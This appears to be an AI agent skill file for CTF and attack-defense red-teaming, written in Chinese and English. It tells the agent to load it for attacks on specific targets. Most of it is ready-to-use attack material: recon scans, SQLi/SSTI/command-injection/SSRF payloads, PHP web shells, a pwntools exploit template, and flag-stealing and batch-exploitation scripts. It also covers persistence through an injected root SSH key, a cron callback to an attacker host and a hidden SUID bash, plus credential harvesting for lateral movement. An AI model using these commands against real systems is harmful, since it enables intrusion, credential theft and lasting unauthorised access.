---
name: ctf-red-team
description: CTF 红队完整战术块：侦察命令模板（nmap/fscan/ffuf/子域收集）、Web 打击检测矩阵（SQLi/SSTI/RCE/SSRF/文件上传绕过清单）、Pwn 模板（cyclic 定位/ROPgadget/libc 泄露/exploit.py 双模式）、逆向与 crypto 速查表（RSA 攻击表/angr 约束求解）、AWD 抢分与 flag 自动提交、批量打靶脚本、持久化与横向移动。当任务目标是对具体靶机/题目做进攻（拿 flag/getshell/打点/抢分），或用户提到「红队/攻击/exploit/pwn/web 打点」时读本 skill。
---

# CT Attack-Defense 红队块（01-Red-Team-Block）

依赖内核纪律（证据三态、copy-first、四件套、意图锁）——见 skill ctf-kernel。以下是红队完整战术与命令模板。

---

## 1. Execution chain & tempo

```text
recon → identify track → strike (web/pwn/re/crypto/misc) → exploit → post-exploitation/persistence → flag capture → lateral → automation → submit
```

Every stage must produce: **raw output → interpretation → next command**. In fast tempo (AWD) prefer high hit-rate paths; in slow tempo (single challenge) prefer complete evidence.

## 2. Per-track deliverable formats (DIRECT output shapes)

| Track | Deliverable shape | Format notes |
|---|---|---|
| Reverse/crackme-style | patch table + algorithm recovery + test vectors | patch table: `address/offset | original bytes | patched | effect`, list every change; algorithm recovery ships a runnable generator; ≥1 test vector |
| Pwn | exploit.py (local/remote dual mode) | `args.REMOTE` switch; OFFSET/base/gadget sections marked; rerun 3× for stability |
| Web | reproducible request + exploitation script | one-line curl repro + Python(requests) script + result/flag extraction |
| Crypto | deterministic solver.py | parse input → derive unknowns → decrypt/forge → verify → search for flag |
| Misc/forensics | transformation-chain record + per-stage derived artifacts | reproducible parameters; original hash; flag evidence location |
| No sample/params yet | placeholder template first | structure filled, real values slotted; ship ≥2-row patch-table skeleton + full script skeleton first, backfill on arrival |

## 3. Recon (information gathering)

```bash
# alive & ports
nmap -sn <CIDR>/24 -oG alive.txt
nmap -sS -sV -Pn -p- -T4 --min-rate 3000 <TARGET> -oA recon/tcp_full
nmap -sU --top-ports 100 -Pn <TARGET> -oA recon/udp_top      # UDP often missed

# web fingerprint & headers
whatweb -a 3 http://<TARGET>
curl -sI http://<TARGET> | head -30

# directory/file busting
ffuf -u http://<TARGET>:<PORT>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,307,401,403 -t 50
ffuf -u http://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.bak,.zip,.txt

# subdomains (domain scenario)
subfinder -d <DOMAIN> -silent | httpx -silent -o recon/subs.txt

# AWD quick sweep
fscan -h <CIDR> -p 1-65535 -o recon/fscan.txt
```

Interpretation notes: `.bak/.zip/.git/`, source leaks, unauthorized endpoints, high-port services first. Passive info (challenge attachments, version strings, error messages) precedes active scanning.

## 4. Web strikes (detection matrix + exploitation)

**Generic probes (per parameter/endpoint)**:

```bash
# SQLi boolean contrast
curl -si 'http://<TARGET>/item?id=1%27%20AND%201=1--%20' | head -1
curl -si 'http://<TARGET>/item?id=1%27%20AND%201=2--%20' | head -1
# SQLi error / time
' AND extractvalue(1,concat(0x7e,version()))--
' AND sleep(5)--
# SSTI / expression
{{7*7}}  ${7*7}  <%=7*7%>  #{7*7}
# command injection
;id  |id  `id`  $(id)  %0aid
# file inclusion
....//....//etc/passwd   php://filter/convert.base64-encode/resource=index.php
# SSRF
http://127.0.0.1:80/admin   http://169.254.169.254/latest/meta-data/
# minimal XSS verification
"><img src=x onerror=alert(1)>
```

**Tool up after confirmation**:

```bash
sqlmap -u 'http://<TARGET>/item?id=1' --batch --level=3 --risk=2 --dbs
sqlmap -r request.txt --batch --level=5 --risk=3 --os-shell
nuclei -u http://<TARGET> -severity critical,high -o nuclei.txt
ffuf -u http://<TARGET>/api/FUZZ -w api_words.txt -X POST -H 'Content-Type: application/json' -d '{}' -mc 200 -fc 404
```

**File-upload bypass checklist** (try one at a time, one variable per attempt):

```text
extensions: .php .php3 .php5 .phtml .pHp .php.  .php::$DATA  .php%00.jpg
Content-Type: image/png / image/gif / text/plain
magic bytes: GIF89a / \x89PNG / BM
path: case tricks / double write / semicolon / space / dot truncation
helpers: .htaccess / .user.ini  AddType application/x-httpd-php .jpg
```

**Landing & verification**:

```php
<?php @eval($_POST['cmd']);?>
<?php system($_GET['c']);?>
```
```bash
curl -s -X POST http://<TARGET>/upload/.idx.php -d 'cmd=id'
curl -s 'http://<TARGET>/upload/.idx.php?c=cat%20/flag'
```

## 5. Pwn / binary

```bash
file chall && checksec --file=chall && readelf -h chall | head
strings -n 8 chall | head -50

# crash offset
pwn cyclic 600 > /tmp/p
gdb -q ./chall -ex 'run < /tmp/p' -ex 'bt' -ex 'info registers rip'
pwn cyclic -l <value-from-RIP>

# gadgets
ROPgadget --binary chall --only 'pop|ret' | grep -E 'pop rdi|pop rsi|leave'
one_gadget ./libc.so.6
```

**Exploit engineering template**:

```python
#!/usr/bin/env python3
from pwn import *
context(log_level='info', arch='amd64', os='linux')
BIN = './chall'
elf = ELF(BIN, checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def start():
    return remote('<HOST>', <PORT>) if args.REMOTE else process(BIN)

p = start()
# ---- stage 1: offset confirmation (from pwn cyclic) ----
OFFSET = 0x??
pop_rdi = 0x???
# ---- stage 2: leak ----
# p.sendlineafter(b'>', payload)
# leak = u64(p.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
# base = leak - libc.sym['?']
# ---- stage 3: exploitation ----
# payload = flat(b'A'*OFFSET, pop_rdi, next(libc.search(b'/bin/sh')), libc.sym['system'])
# p.sendline(payload)
p.interactive()
```

Verification order: local `process` works → switch `args.REMOTE` → rerun 3× for stability. Local works, remote doesn't: compare libc versions (measure via `ldd`, never guess), leaked base values, stack alignment (pad one extra `ret`).

## 6. Reverse / crypto (challenge solving)

```bash
# static trio
file chall; strings -n 8 chall; r2 -A chall -q -c 's main; pdf'
# dynamic
ltrace ./chall; strace -f ./chall
# special formats
ilspycmd target.dll    # .NET
jadx -d out target.apk # APK
```

**angr constraint solving**:

```python
import angr
proj = angr.Project('./chall', auto_load_libs=False)
simgr = proj.factory.simulation_manager(proj.factory.entry_state())
simgr.explore(find=0x<SUCCESS>, avoid=0x<FAIL>)
if simgr.found:
    print(simgr.found[0].posix.dumps(0))
```

**Crypto quick-judge table**:

| Condition | Attack | Tool |
|---|---|---|
| e=3 and small m | direct cube root | `gmpy2.iroot(c,3)` |
| same n, same e, multiple ciphertexts | common modulus | gcd + extended Euclid |
| factorable n (close factors) | Fermat | Sage `fermat(n)` |
| huge e | Wiener | `owiener.attack(e,n)` |
| small e + partial plaintext | Coppersmith | Sage `small_roots` |
| same c, multiple n | broadcast attack | CRT then e-th root |
| AES fixed IV / ECB | mode analysis | block comparison |
| predictable RNG | MT19937 recovery | `randcrack` |

**Misc / forensics**: hash the original, operate on copies; save every extract/decode stage as a separate derived artifact; check file signatures, metadata, embedded objects, archives, filesystems, memory images, PCAPs, timestamps; record the complete transformation chain with parameters; search every text extraction for `flag\{.*?\}` and the given format.

## 7. AWD strike & flag (combat core)

**Priority**: take opponent service shell → read flag → submit → leave persistence.

```bash
# common flag locations
cat /flag /flag.txt /root/flag /home/*/flag* 2>/dev/null
env | grep -iE 'flag|ctf'
find / -maxdepth 3 -iname 'flag*' -not -path '/proc/*' 2>/dev/null
mysql -uroot -p<pass> -e 'select * from flag' 2>/dev/null
```

**Flag read + auto-submit**:

```python
#!/usr/bin/env python3
# awd_submit.py
import requests, glob
SCOREBOARD = 'http://<SCOREBOARD>/api/submit'
TOKEN = '<TEAM_TOKEN>'

def find_flag():
    paths = ['/flag', '/flag.txt'] + glob.glob('/home/*/flag*') + glob.glob('/var/www/*flag*')
    for p in paths:
        try:
            v = open(p).read().strip()
            if v and len(v) < 200:
                return v
        except Exception:
            pass
    return None

def submit(flag):
    r = requests.post(SCOREBOARD, json={'token': TOKEN, 'flag': flag}, timeout=5)
    print(r.status_code, r.text[:200])

if __name__ == '__main__':
    f = find_flag()
    print('FLAG =', f)
    if f:
        submit(f)
```

(Adjust submission fields per platform docs; verify once manually with `curl -v` before batching.)

**Persistence** (deliverables must include recovery verification and survivability notes):

```bash
# SSH public key
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo 'ssh-ed25519 <YOUR_PUBKEY> kali@atk' >> /root/.ssh/authorized_keys
# timed callback
(crontab -l 2>/dev/null; echo '*/3 * * * * curl -s http://<ATK>/hb >/dev/null 2>&1') | crontab -
# discreet landing spots
/var/www/html/uploads/.cache.php
/tmp/.x  → driven by cron
# SUID backup channel
cp /bin/bash /tmp/.bash && chmod 4755 /tmp/.bash
```

**Lateral movement (AWD intranet / exercise)**:

```bash
cat /root/.bash_history /var/www/*/config*.php 2>/dev/null | grep -iE 'pass|key|token'
fscan -h <内网CIDR> -np -o intranet.txt
sshpass -p '<PASS>' ssh root@<NEXT_HOST> 'id'
```

## 8. Batch automation (multi-target scoring)

```python
#!/usr/bin/env python3
# batch_hit.py — replace exploit() with the real vulnerability
import concurrent.futures, requests
TARGETS = ['10.0.0.11', '10.0.0.12', '10.0.0.13']
PAYLOAD = {'cmd': 'cat /flag'}

def exploit(host):
    try:
        r = requests.post(f'http://{host}/vuln.php', data=PAYLOAD, timeout=3)
        if r.status_code == 200 and r.text.strip():
            return host, 'HIT', r.text.strip()[:120]
        return host, 'MISS', r.status_code
    except Exception as e:
        return host, 'ERR', str(e)[:80]

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    for host, st, out in ex.map(exploit, TARGETS):
        print(f'[{st}] {host} :: {out}')
```

Extension points: concurrency, timeouts, exploit function, auto-call `awd_submit.py` on hit. Break one target manually with recorded evidence before batching; never count noise as hits.

## 9. Red-side execution discipline (block-specific)

1. **Chain by observable stages**: `primitive → leak/control → derived state → final payload → verified effect`, each stage verifiable.
2. **Injection variants tested systematically**: encoding / closure / comment / case / null-byte / double-write / parser-differential, one variable at a time.
3. **Think like the developer first**: where data/decisions live, where the trust boundary is, which inputs the server accepts, which data cannot exist at that layer — then pick the attack surface.
4. **Claim flags only on exact evidence**: location + literal value + submission receipt, all three; "probably somewhere" doesn't count.
5. **Exclusions are evidence**: record exclusion evidence for dead paths; after 2–3 meaningful failures, pivot and carry the exclusions along.
6. **After a shell, do environment recovery first**: env, config, temp files, databases, processes, service dirs → then consider privilege escalation (sudo/SUID/cron/container boundaries/kernel).


---
